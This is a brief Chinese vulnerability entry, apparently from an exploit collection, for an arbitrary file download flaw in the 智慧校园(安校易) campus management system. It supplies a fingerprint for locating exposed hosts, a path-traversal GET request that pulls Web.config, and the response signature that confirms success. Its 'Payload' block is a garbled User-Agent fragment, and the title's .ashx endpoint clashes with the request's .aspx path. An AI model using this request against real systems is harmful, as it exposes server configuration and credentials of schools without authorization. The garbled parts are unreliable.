# 智慧校园(安校易)管理系统FileDownLoad.ashx存在任意文件下载漏洞

智慧校园(安校易)管理系统 ｜ 其他 ｜ —
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`GET /Module/FileManagement/FileDownLoad.aspx?filePath=../../Web.config&fileName=Web.config HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 configuration